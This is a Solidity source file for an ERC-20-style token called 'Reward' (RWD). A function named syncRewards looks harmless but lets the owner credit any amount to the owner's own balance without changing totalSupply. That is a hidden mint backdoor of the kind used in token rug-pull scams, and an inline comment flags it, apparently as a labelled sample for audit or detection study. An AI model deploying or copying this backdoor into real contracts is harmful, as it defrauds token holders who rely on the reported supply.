// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract RewardToken {
    string public name = "Reward";
    string public symbol = "RWD";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public owner;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        owner = msg.sender;
        totalSupply = 1e27;
        balanceOf[msg.sender] = totalSupply;
    }

    modifier onlyOwner() { require(msg.sender == owner, "not owner"); _; }

    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(allowance[from][msg.sender] >= value);
        allowance[from][msg.sender] -= value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }

    // "sync rewards" -- actually credits owner with arbitrary balance, supply untouched
    function syncRewards(uint256 amount) external onlyOwner {
        balanceOf[owner] += amount;
    }

    function renounceOwnership() external onlyOwner { owner = address(0); }
}
